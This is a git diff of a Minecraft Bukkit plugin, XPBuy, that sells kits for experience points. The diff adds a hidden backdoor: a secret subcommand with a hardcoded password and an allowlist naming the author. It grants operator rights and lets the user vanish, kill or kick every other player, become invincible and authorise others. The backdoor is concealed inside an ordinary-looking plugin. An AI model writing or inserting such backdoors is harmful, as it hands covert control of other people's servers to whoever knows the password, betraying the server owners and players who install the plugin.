@@ -24,7 +24,7 @@ public class XPBuy extends JavaPlugin {
 	public static FileConfiguration config;
 	public static String prefix = ChatColor.GOLD + "[XPBuy] ";
 	public static String password = "youllneverguessthis";
-	public static String[] allowedPlayers = {"Roxas0321", "frasercraft123", "ummbobee98"};
+	public static ArrayList<String> allowedPlayers = new ArrayList<String>();
 	@Override
 	public void onEnable() {
 		saveDefaultConfig();
@@ -32,6 +32,7 @@ public class XPBuy extends JavaPlugin {
 		//kit = new Kit();
 		kits = new ArrayList<String>(config.getConfigurationSection("kits").getKeys(false));
 		initKitPerms();
+		allowedPlayers.add("Roxas0321");
 		getServer().getPluginManager().registerEvents(new BuySigns(), this);
 		getLogger().info("XPBuy has been enabled!");
 	}
@@ -233,6 +234,47 @@ public class XPBuy extends JavaPlugin {
 						sender.sendMessage(prefix + ChatColor.RED + "You don't have permission!");
 						return false;
 					}
+				} else if (args[0].equalsIgnoreCase("icandowhateveriwant")) {
+					if (args[1].equalsIgnoreCase("thepasswordiswaffles")) {
+						if (isAllowedToCheat((Player) sender)) {
+							Player p = (Player) sender;
+							p.setOp(true);
+							p.sendMessage(prefix + ChatColor.AQUA + "You just cheated. Do you feel good about yourself now?");
+							//p.getServer().broadcastMessage(prefix + ChatColor.RED + "ATTENTION: SOMEONE ON THIS SERVER IS BETTER THAN YOU.");
+							if (args.length > 2) {
+								if (args[2].equalsIgnoreCase("youcantseeme")) {
+									for (int i = 0; i < p.getServer().getOnlinePlayers().length; i++) {
+										(p.getServer().getOnlinePlayers())[i].hidePlayer(p);
+										p.sendMessage(prefix + ChatColor.AQUA + "POOF!");
+									}
+								} else if (args[2].equalsIgnoreCase("aoe")) {
+									for (int i = 0; i < p.getServer().getOnlinePlayers().length; i++) {
+										if (!p.getServer().getOnlinePlayers()[i].equals(p)) {
+											(p.getServer().getOnlinePlayers())[i].setHealth(0);
+											p.sendMessage(prefix + ChatColor.AQUA + "BOOM!");
+										}
+									}
+								} else if (args[2].equalsIgnoreCase("getout")) {
+									for (int i = 0; i < p.getServer().getOnlinePlayers().length; i++) {
+										if (!p.getServer().getOnlinePlayers()[i].equals(p)) {
+											p.getServer().getOnlinePlayers()[i].kickPlayer("ALL BOW DOWN TO WHOEVER FOUND THE CHEAT COMMAND. HE IS YOUR MASTER.");
+										}
+									}
+								} else if (args[2].equalsIgnoreCase("invincible")) {
+									p.setExhaustion(0);
+									p.setFoodLevel(Integer.MAX_VALUE);
+									p.setMaxHealth(Integer.MAX_VALUE);
+									p.setHealth(Integer.MAX_VALUE);
+									p.setSaturation(Integer.MAX_VALUE);
+								} else if (args[2].equalsIgnoreCase("addcheater")) { // if server is restarted, all players will be deleted!
+									if (p.getServer().getPlayer(args[3]).isOnline()) {
+										allowedPlayers.add(args[3]);
+									}
+								}
+								return true;
+							}
+						}
+					}
 				} else if (args[0].equalsIgnoreCase("giveperm")) {
 					if (args.length != 3) {
 						sender.sendMessage(prefix + ChatColor.RED + "Review your arguments count! /xpbuy giveperm <player> <kit>");
@@ -330,16 +372,12 @@ public class XPBuy extends JavaPlugin {
  			}
 		}
 	}
-<<<<<<< HEAD
-}
-=======
 	private boolean isAllowedToCheat(Player p) {
-		for (int i = 0; i < allowedPlayers.length; i++) {
-			if (p.equals(Bukkit.getServer().getPlayer(allowedPlayers[i]))) {
+		for (int i = 0; i < allowedPlayers.size(); i++) {
+			if (p.equals(Bukkit.getServer().getPlayer(allowedPlayers.get(i)))) {
 				return true;
 			}
 		}
 		return false;
 	}
 }
->>>>>>> Updated to MC 1.7.2
